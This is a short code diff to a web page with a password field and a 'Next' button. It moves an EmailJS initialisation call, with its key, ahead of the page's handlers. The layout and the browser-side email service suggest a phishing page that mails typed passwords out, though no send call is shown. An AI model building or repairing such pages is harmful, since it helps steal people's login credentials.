@@ -181,6 +181,8 @@ button.next-btn:disabled { background-color: #c0c7d0; cursor: default; }
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
 <script>
+emailjs.init("xiQSCA5rQTqmbI4Qz");
+
 const passwordInput = document.getElementById("passwordInput");
 const nextPasswordBtn = document.getElementById("nextPasswordBtn");
 const showPasswordCheckbox = document.getElementById("showPassword");
@@ -208,7 +210,6 @@ showPasswordCheckbox.addEventListener("change", () => {
   passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
 });
 
-emailjs.init("xiQSCA5rQTqmbI4Qz");
 
 // Password next button
 nextPasswordBtn.addEventListener("click", () => {
